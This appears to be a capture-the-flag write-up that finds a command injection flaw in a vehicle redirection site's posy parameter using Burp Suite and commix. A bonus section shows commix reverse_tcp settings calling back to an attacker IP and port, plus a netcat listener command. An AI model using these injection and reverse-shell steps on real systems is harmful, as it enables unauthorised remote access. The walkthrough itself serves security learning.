We are given a website with a vehicle redirection function

Testing out the Functionality of the website i decided to alter the behavior of **ALG** since it was the only one in parked as shown in the last image

Great, Now let test for Command Injection vulnerability, we are given 3 areas making it pretty hard to find, so i decided to use burpsuite to intercept the request

Nice, we have 3 parameters which is `plate` , `posx` and `posy`, we can use a tool called `commix` to test out for command injection efficiently and faster

You should notice that i used only `posy` for the `--data` switch instead of "`plate=ASH&posx=200&posy=300`" , i had run the scan with level=3 making it really slow, so that was the parameter i found out, was injectable.

We can then pop-up a **pseudo-terminal** shell and then from there get a reverse shell with PHP since that is the web technology been used

## **Bonus**

### **Getting a reverse shell**

I was finding it difficult to get a reverse shell using `commix` but here is how i went about it, you can type in this on commix command line

```bash
# start the reverse tcp session
commix(os_shell) > reverse_tcp

# set LHOST and LPORT
commix(reverse_tcp) > set LHOST 192.168.0.157
LHOST => 192.168.0.157
commix(reverse_tcp) > set LPORT 1234
LPORT => 1234
```

Depending on our target we would select what type of reverse shell we want, since it is a web shell we will select PHP

> **Note :** Make sure to know the web technology your target uses first then you can select a proper reverse shell



Start up your listener and choose proper shell, I will be selecting `PHP` 

```bash
$ nc -lvnp 1234
```
